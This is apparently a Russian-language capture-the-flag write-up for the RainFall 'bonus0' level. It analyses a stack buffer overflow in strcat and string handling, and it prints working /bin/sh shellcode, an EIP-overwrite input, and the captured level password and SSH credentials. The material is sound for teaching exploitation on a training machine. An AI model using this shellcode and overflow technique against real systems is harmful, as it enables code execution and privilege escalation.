### bonus

0. Заходим под пользователем: `ssh bonus@172.16.188.131 -p 4242` / `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`

1. Запускаем бинарник `./bonus` видим что нам предлагается что-то ввести и потом еще раз:

```
bonus0@RainFall:~$ ./bonus0
 -
aaa
 -
bbb
aaa bbb
```

Что делает бинарник? Считывает поочередно строки и скеивает их с пробельным разделителем.

2. Запускаем бинарник на граничных тестах:

- Сначала первая большая строка:

```
bonus0@RainFall:~$ ./bonus0
 -
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 -
b
aaaaaaaaaaaaaaaaaaaab b
```

- Затем первая и вторая большие строки:

```
bonus0@RainFall:~$ ./bonus0
 -
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 -
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
?aaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbb??? bbbbbbbbbbbbbbbbbbbb???
Segmentation fault (core dumped)
```

Вывод есть какая-то проблема с переполнением, программа работает не так как нужно да еще и получаем `Segmentation fault (core dumped)`

3. Залезем "под капот" `gdb ./bonus0`

- Видим что глобальных переменных нет
- Видим что есть три функции `p`, `pp`, `main`

4. Воспроизведем возможный исходный кода
5. Понимаем что у нас есть:

- результирующая строка на примерно на 42 байта
- есть две донор строки в функции `pp`, притом что str1 и str2 идут следом
- есть огромный стек на 4100 байт который никак не используется, посути из этого стека забирается всего 20 байтов

6. Из уязвимых мест:

- есть вот такая строка `*strchr(buff, '\n') = 0`, условно если мы ввели 100500 символов, в конце поставим '\n' но в донор функцию мы заберем ровно 20 байт, причем эта строка не будет завершена \n
- есть `strcat(buff, str2)` и мы знаем что эту функцию можно просто переполнить

7. Прочитав кучу решений бонуса я так и не понял для чего нам тут заполнять полностью вторую строку, я [распечатал стек](https://docs.google.com/spreadsheets/d/1H5iB0JTp7LUWYwOSUbgJxPUX6dzPQ6IhI4dHI_tYsoI/edit#gid=0)

8. Прохождение:
   - Заполняем первую строку уже на известным шелкодом

```
export SHELLCODE=`python -c 'print("\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'`
```

- Ищем адрес на переменную окружения:

```
import ctypes
libc = ctypes.CDLL("libc.so.6")
getenv = libc.getenv
getenv.restype = ctypes.c_voidp
print('%08x' % getenv('SHELLCODE'))
----------------------------------------------------------------
>>> bffff4ea
```

- Подбираем последовательность так, чтобы попасть на адрес eip
```
bonus0@RainFall:~$ (python -c "print('A' * 20)";     python -c "print('B' * 9 + '\xea\xf4\xff\xbf' + 'B' * 7)"; cat) | ~/bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAABBBBBBBBB????BBBBBBB??? BBBBBBBBB????BBBBBBB???
$ whoami
bonus1
$ cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

### Слепки стеков:
- Слепок функции `main`

```
eax = esp + 0x16 = esp + 22;


ebp  0xbffff738               |


ebp - 50 = esp + 0x16 = esp + 22 |  result = (0xbffff710) 0123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa




esp = ebp - 0x40 = ebp - 64   | esp + 0x16 = esp + 22
```

- Слепок функции `pp`

```

0x80486a0 = ' - '
0x80486a4 = " "
eax = 0
edx = param1
ebx = 0x0486a4
ecx = ebp - 0x3c = ebp - 60
param1 = ebp + 8
eip = ebp + 4
ebp                              |

ebp - 9                          | str2.finish (0xBFFFF6DF) a
(всего 20 байт)     20 байт -                               Aa0Aa1Aa2Aa3Aa4Aa5Aa
ebp - 0x1c = ebp - 28            | str2.start (0xBFFFF6CC)  A
ebp - 29                         | str1.finish (0xBFFFF6CB) 9
               (всего 20 байт)     20 байт -                01234567890123456789
ebp - 0x30 = ebp - 48 = esp + 32 | str1.start (0xBFFFF6B8)  0

ebp - 0x3c = ebp - 60            | 0xffffffff


esp + 8                          |
esp + 4                          | ebp - 0x1c = ebp - 28
esp = ebp - 0x50 = ebp - 80      | param1
```

- Слепок функции `p`

```
eax =

eax = ebp - 0x1008 (4104)
param2 = ebp + 12 = ebp + 0xc = ' - '
param1 = ebp + 8 = ebp_pp - 0x30 = ebp_pp - 48 = esp_pp + 32
eip = ebp + 4
ebp                              |



ebp - 0x1008 (4104)



exp + 8                                | 0x14(20)
esp + 4                                | ebp - 0x1008 (4104)
esp = ebp - 0x1018 = ebp - 4120        | ebp_pp - 0x30 = ebp_pp - 48 = esp_pp + 32
```

01234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa
